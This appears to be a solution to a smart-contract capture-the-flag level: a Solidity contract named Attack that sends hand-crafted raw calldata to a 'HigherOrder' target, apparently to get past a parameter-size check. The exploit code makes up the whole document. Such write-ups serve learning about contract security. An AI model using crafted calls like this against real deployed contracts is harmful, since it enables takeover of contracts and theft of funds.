## Description
```
contract Attack{
    HigherOrder public higherOrder;

    constructor(address _higherOrder) public {
        higherOrder = HigherOrder(_higherOrder);
    }

    function attack()public {
        bytes memory data = hex"211c85ab000000000000000000000000000000000000000000000000000000000000ff00";
        (bool success, ) = address(higherOrder).call(data);
        require(success, "Call failed");
    }
}
```